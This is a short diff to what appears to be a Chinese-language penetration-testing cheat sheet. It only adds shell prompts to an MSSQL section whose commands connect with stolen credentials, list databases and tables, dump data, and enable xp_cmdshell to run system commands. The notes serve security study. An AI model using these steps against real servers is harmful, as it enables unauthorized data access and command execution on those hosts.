@@ -143,21 +143,21 @@ date: 2024-02-07
 
   ```bash
   $ impacket-mssqlclient <username>:<password>@<MSSQL IP> -windows-auth # 連線
-  SELECT @@version; # 查版本（同時揭露 Windows Server 版本）
-  SELECT SYSTEM_USER; # 查看當前使用者
-  SELECT name FROM sys.databases; # 列資料庫
-  use <database_name>;
-  SELECT * FROM <database_name>.information_schema.tables; # 查表
-  SELECT * FROM <database_name>.dbo.<table_name>; # 查資料（注意需加 dbo schema）
+  $ SELECT @@version; # 查版本（同時揭露 Windows Server 版本）
+  $ SELECT SYSTEM_USER; # 查看當前使用者
+  $ SELECT name FROM sys.databases; # 列資料庫
+  $ use <database_name>;
+  $ SELECT * FROM <database_name>.information_schema.tables; # 查表
+  $ SELECT * FROM <database_name>.dbo.<table_name>; # 查資料（注意需加 dbo schema）
 
   # 拿 shell: 前提是 xp_cmdshell 有啟用，設想情境是
   ## 1. 拿到 MSSQL Cred. 之後
   ## 2. 進入 MSSQL 修改 show advanced options 啟用 xp_cmdshell
-  EXEC sp_configure 'show advanced options', 1;
-  RECONFIGURE;
-  EXEC sp_configure 'xp_cmdshell', 1;
-  RECONFIGURE;
-  EXEC xp_cmdshell 'whoami';
+  $ EXEC sp_configure 'show advanced options', 1;
+  $ RECONFIGURE;
+  $ EXEC sp_configure 'xp_cmdshell', 1;
+  $ RECONFIGURE;
+  $ EXEC xp_cmdshell 'whoami';
   ```
 
 </details>
